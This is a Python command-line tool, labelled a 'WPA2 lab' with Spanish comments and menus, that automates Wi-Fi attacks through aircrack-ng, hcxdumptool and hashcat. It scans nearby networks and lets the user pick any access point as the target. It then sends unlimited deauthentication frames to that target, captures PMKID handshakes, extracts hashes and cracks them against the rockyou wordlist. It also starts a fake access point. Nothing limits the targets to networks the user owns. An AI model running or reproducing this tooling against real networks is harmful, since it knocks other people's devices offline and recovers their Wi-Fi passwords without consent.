#!/usr/bin/env python3
"""
WPA2 Lab CLI – AirStrike Edition
© 2025
"""
from __future__ import annotations
import csv, logging, re, shutil, subprocess, sys, tempfile, time
from pathlib import Path
from typing import List, Optional, Tuple


import typer, yaml
from rich import box
from rich.console import Console, Group
from rich.panel import Panel
from rich.table import Table
from rich.align import Align      # ← AÑADE ESTA LÍNEA
# ---------------------------------------------------------------------------------
# 🔧 ─ Config & Logging
# ---------------------------------------------------------------------------------
SCRIPT_DIR   = Path(__file__).resolve().parent
PROJECT_ROOT = SCRIPT_DIR.parent
CFG_FILE     = PROJECT_ROOT / "config.yaml"
LOG_FILE     = PROJECT_ROOT / "logs/wpa2lab.log"

def load_cfg() -> dict:
    return yaml.safe_load(CFG_FILE.read_text()) if CFG_FILE.exists() else {}
CFG = load_cfg()

logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("wpa2lab")

console = Console()
cli = typer.Typer(add_completion=False)       # para ejecución “python archivo.py …”

# ---------------------------------------------------------------------------------
# ✨ ─ Ascii logo
# ---------------------------------------------------------------------------------
LOGO = """
██╗    ██╗ ██████╗   █████╗  ██████╗  ██╗       █████╗  ██████╗ 
██║    ██║ ██╔══██╗ ██╔══██╗ ╚════██║ ██║      ██╔══██╗ ██╔══██╗
██║ █╗ ██║ ██████╔╝ ███████║  █████╔╝ ██║      ███████║ ██████╔╝
██║███╗██║ ██╔═══╝  ██╔══██║ ██╔═══╝  ██║      ██╔══██║ ██╔══██╗
╚███╔███╔╝ ██║      ██║  ██║ ███████╗ ███████╗ ██║  ██║ ██████╔╝
 ╚══╝╚══╝  ╚═╝      ╚═╝  ╚═╝ ╚══════╝ ╚══════╝ ╚═╝  ╚═╝ ╚═════╝ 
"""


# ── Helpers ────────────────────────────────────────────────────────────────
def run(cmd: list[str], *, sudo=False):
    full = ["sudo", *cmd] if sudo else cmd
    console.log(f"[cyan]$ {' '.join(full)}")
    log.info("CMD %s", " ".join(full))
    subprocess.run(full, check=True)

def ensure(tool: str, pkg: str|None=None):
    if shutil.which(tool): return
    console.print(f"[red]Falta:[/] {tool}  – sudo apt install {pkg or tool}")
    raise typer.Exit()

def iw_interfaces() -> List[str]:
    out = subprocess.check_output(["iw","dev"], text=True)
    return re.findall(r"Interface\s+(\w+)", out)

def iface_monitor() -> Optional[str]:
    return next((i for i in iw_interfaces() if i.endswith("mon")), None)

def ask_iface(role: str, allow_mon: bool) -> str:
    wl = iw_interfaces()
    if not allow_mon:
        wl = [i for i in wl if not i.endswith("mon")]
    tbl = Table("idx","Interfaz", box=box.SIMPLE_HEAVY)
    for i,iface in enumerate(wl): tbl.add_row(str(i), iface)
    console.print(tbl)
    idx = int(console.input(f"{role} (nº) >> ") or 0)
    return wl[idx]

# ── Acciones ────────────────────────────────────────────────────────────────
def act_prepare():
    ensure("airmon-ng")
    iface = ask_iface("Elegir interfaz para MONITOR", allow_mon=False)
    run(["airmon-ng","check","kill"], sudo=True)
    run(["airmon-ng","start", iface], sudo=True)
    console.print(f"[green bold]✓[/] {iface} → {iface}mon")

def act_reset():
    ensure("airmon-ng")
    mons = [i for i in iw_interfaces() if i.endswith("mon")]
    if not mons:
        console.print("[yellow]No hay interfaces en monitor[/]"); return
    for m in mons:
        run(["airmon-ng","stop", m], sudo=True)
    console.print("[green bold]✓[/] Interfaces restauradas (modo gestionado)")

def act_ap():
    ensure("hostapd"); ensure("dnsmasq")
    iface = ask_iface("Interfaz para AP", allow_mon=False)
    run(["ip","link","set",iface,"up"], sudo=True)
    run(["ip","addr","flush","dev",iface], sudo=True)
    run(["ip","addr","add","10.0.0.1/24","dev",iface], sudo=True)
    subprocess.run(["sudo","killall","hostapd"], check=False)
    subprocess.run(["sudo","killall","dnsmasq"], check=False)

    hapd = tempfile.NamedTemporaryFile("w", delete=False, suffix=".conf")
    hapd.write(f"interface={iface}\nssid=WPA2_LAB_FAKE\nchannel=6\nhw_mode=g\n"
               "wpa=2\nwpa_passphrase=Demo12345\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n")
    hapd.close()
    dns = tempfile.NamedTemporaryFile("w", delete=False, suffix=".conf")
    dns.write(f"interface={iface}\ndhcp-range=10.0.0.10,10.0.0.50,12h\n")
    dns.close()

    run(["hostapd","-B",hapd.name], sudo=True)
    run(["dnsmasq","-C",dns.name],  sudo=True)
    console.print(f"[green bold]✓[/] AP activo en {iface}  (10.0.0.1)")

def act_scan(duration=6) -> list[Tuple[str,str,int,str]]:
    ensure("airodump-ng")
    mon = iface_monitor()
    if not mon: console.print("[red]Activa monitor primero (1)[/]"); return []
    tmp = tempfile.NamedTemporaryFile(suffix=".csv", delete=False)
    p = subprocess.Popen(
        ["sudo","airodump-ng","--write-interval","1","--output-format","csv",
         "-w", tmp.name[:-4], mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    console.print(f"[cyan]Escaneando {duration}s…[/]"); time.sleep(duration); p.terminate()
    csv_file = Path(tmp.name[:-4]+"-01.csv")

    nets = []
    with csv_file.open(errors="ignore") as f:
        rdr = csv.reader(f); seen=False
        for r in rdr:
            if not r: continue
            if r[0].startswith("BSSID"): seen=True; continue
            if seen and len(r)>13 and re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", r[0]):
                nets.append((r[0].strip(), r[13].strip() or "<Hidden>", int(r[3]), r[5]))
    if not nets:
        console.print("[yellow]No se detectaron APs"); return []
    tbl = Table("idx","BSSID","ESSID","CH","ENC", box=box.SIMPLE_HEAVY)
    for i,(b,e,ch,enc) in enumerate(nets): tbl.add_row(str(i), b, e, str(ch), enc)
    console.print(tbl)
    idx = int(console.input("Objetivo nº >> ") or 0)
    CFG["last"] = {"bssid": nets[idx][0], "channel": nets[idx][2]}
    (SCRIPT_DIR/"last.yaml").write_text(yaml.safe_dump(CFG))
    console.print(f"[green]✓[/] Objetivo: {nets[idx][0]}")
    return nets

def act_deauth():
    ensure("aireplay-ng","aircrack-ng")
    mon = iface_monitor(); target = CFG.get("last",{})
    if not (mon and target):
        console.print("[red]Necesitas monitor y objetivo (scan)[/]"); return
    run(["aireplay-ng","--deauth","0","-a",target["bssid"],mon], sudo=True)

def act_capture():
    ensure("hcxdumptool")
    mon = iface_monitor()
    if not mon: console.print("[red]Monitor no activo[/]"); return
    tgt = CFG.get("last",{})
    if not tgt:
        bssid = console.input("BSSID >> ").strip().upper()
        ch    = console.input("Canal >> ").strip()
    else:
        bssid, ch = tgt["bssid"], str(tgt["channel"])
    out = PROJECT_ROOT/"dump.pcapng"
    console.print(f"[cyan]Capturando PMKID de {bssid} (CH {ch}) – CTRL-C para parar[/]")
    try:
        run(["hcxdumptool","-i",mon,"-c",ch,"-t",bssid,"-o",str(out)], sudo=True)
    except KeyboardInterrupt:
        pass
    console.print(f"[green bold]✓[/] Guardado → {out}")

def act_extract():
    ensure("hcxpcapngtool","hcxtools")
    run(["hcxpcapngtool","-o",str(PROJECT_ROOT/"hash.22000"),
         str(PROJECT_ROOT/"dump.pcapng")])

def act_crack():
    ensure("hashcat")
    wl = Path("/usr/share/wordlists/rockyou.txt")
    run(["hashcat","-m","22000",str(PROJECT_ROOT/"hash.22000"), str(wl)])

# ── Menú ────────────────────────────────────────────────────────────────────
MENU = [
    ("1", "Modo MONITOR",   act_prepare),
    ("2", "Levantar AP",    act_ap),
    ("3", "Reset IFs",      act_reset),
    ("4", "Escanear redes", act_scan),
    ("5", "Deauth attack",  act_deauth),
    ("6", "Capturar PMKID", act_capture),
    ("7", "Extraer hash",   act_extract),
    ("8", "Crack offline",  act_crack),
    ("0", "Salir",          None),
]

def show_menu():
    console.clear()
    console.print(Panel(Align.center(LOGO), box=box.DOUBLE, style="bold cyan"))
    tbl = Table(box=box.ROUNDED, show_header=False, padding=(0,1))
    tbl.add_column(" Nº ", justify="right", style="magenta bold")
    tbl.add_column("Acción", style="bold white")
    for k,txt,_ in MENU: tbl.add_row(k, txt)
    console.print(tbl)

def interactive():
    actions = {k: f for k, _, f in MENU}
    while True:
        show_menu()
        choice = console.input("[bold cyan]>> [/]").strip()
        if choice == "0":
            console.print("[bold yellow]¡Hasta luego![/]"); break

        fn = actions.get(choice)
        if not fn:
            console.print("[red]Opción inválida[/]"); time.sleep(1); continue

        # ───── Capturamos Ctrl-C durante la ejecución de la acción ─────
        try:
            fn()
        except KeyboardInterrupt:                 # ← NUEVO
            console.print("[yellow]· Operación cancelada ·[/]")  # ← NUEVO
        except Exception as e:
            console.print(f"[red]Error:[/] {e}")
        # ───────────────────────────────────────────────────────────────

        console.input("[green]Intro para menú[/]")

# ── CLI directo (Typer) ────────────────────────────────────────────────────
@cli.command()  # python … monitor
def monitor(): act_prepare()
@cli.command()  # python … ap
def ap():       act_ap()
@cli.command()  # python … scan-cli
def scan_cli(): act_scan()
@cli.command()  # python … deauth
def deauth():   act_deauth()
@cli.command()  # python … capture
def capture():  act_capture()
@cli.command()  # python … extract
def extract():  act_extract()
@cli.command()  # python … crack
def crack():    act_crack()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        cli()          # modo “python script.py comando …”
    else:
        interactive()  # menú gráfico
